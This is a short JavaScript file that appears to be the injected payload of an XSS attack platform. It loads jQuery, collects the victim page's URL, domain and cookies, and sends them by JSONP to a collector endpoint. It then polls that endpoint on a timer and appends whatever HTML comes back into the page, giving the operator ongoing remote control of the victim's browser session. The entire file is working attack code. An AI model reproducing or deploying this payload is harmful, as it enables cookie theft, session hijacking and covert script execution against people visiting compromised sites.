/**
 * 请求地址 \ cookie \当前屏幕截图\ 请求域名
 */
let head = document.getElementsByTagName('head')[0]
let script_jquery = document.createElement('script')
let onload_is_null = false

let xssInfo = {
  cookie: null,
  domain: null,
  url: null,
}
let timer
script_jquery.type = 'text/javascript'

script_jquery.src = 'https://code.jquery.com/jquery-3.1.1.min.js'

head.appendChild(script_jquery)

script_jquery.onload = function () {
  if (window.onload == null) {
    onload_is_null = true
    setTimeout(ajax_xss, 1000)
  }

  window.onload = function () {
    this.ajax_xss()
  }
}

function ajax_xss () {
  try {
    xssInfo.url = escape(document.location.href)
  } catch (e) {
    console.log('获取url异常！')
    xssInfo.url = ''
  }
  try {
    xssInfo.cookie = escape(document.cookie)
  } catch (e) {
    console.log('获取cookie异常！')
    xssInfo.cookie = ''
  }

  try {
    xssInfo.domain = escape(document.domain)
  } catch (e) {
    console.log('获取domain异常！')
    xssInfo.domain = ''
  }
  $.ajax({
    url: 'http://localhost:8001/api/xss/command',
    type: 'GET',
    dataType: 'jsonp',
    data: xssInfo,
    success: function (data) {
      // $('body').append("<script>alert(22222)</script>")
      // console.log('JSONP_DATA:' + JSON.stringify(data))

      if (timer == undefined) {

        timer = window.setInterval(() => {
          let form = {
            id: data.data
          }
          $.ajax({
            url: 'http://localhost:8001/api/xss/command',
            type: 'GET',
            dataType: 'jsonp',
            data: form,
            success: function (data) {
              $('body').append(data.data)
              // console.log('JSONP_DATA:' + JSON.stringify(data))
            }
          })
        }, onload_is_null ? 1000 : 2000)
      }
    }
  })
}

